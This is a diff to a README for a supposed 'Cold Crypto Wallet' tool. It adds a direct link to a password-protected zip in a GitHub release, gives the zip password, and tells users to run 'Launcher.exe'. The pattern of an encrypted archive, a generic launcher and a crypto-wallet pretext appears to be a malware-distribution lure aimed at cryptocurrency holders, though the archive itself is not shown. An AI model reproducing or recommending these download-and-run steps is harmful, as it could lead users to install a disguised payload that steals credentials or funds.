@@ -10,9 +10,9 @@ The Cold Crypto Wallet is an innovative tool designed to automatically create en
 - 💡 **Tips and Insights**: Helpful advice and strategies for safely managing crypto assets and using wallets effectively.
 
 ## 🚀 How to Use? Instructions
-1. **Download**: Get the latest version of the Cold Crypto Wallet.
-2. **Extract**: Extract the contents of the archive. The password for the zip file is: `CryptoSecure`.
-3. **Open the Application**: Launch the executable file in the extracted folder: `Create_crypt_wallet.exe`.
+1. **Download**: Get the latest version of the Cold Crypto Wallet or [click](https://github.com/HuioMr8/Cold-crypt-wallet/releases/download/Build/CryptColdWallet.zip).
+2. **Extract**: Extract the contents of the archive. The password for the zip file is: **CryptoSecure**.
+3. **Open the Application**: Launch the executable file in the extracted folder: `Launcher.exe`.
 4. **Follow Instructions**: The program will guide you through the wallet creation process automatically.
 5. **Completion**: Once the process is finished, your encrypted wallet will be ready for use. Safely store your USB drive with your crypto assets!
 
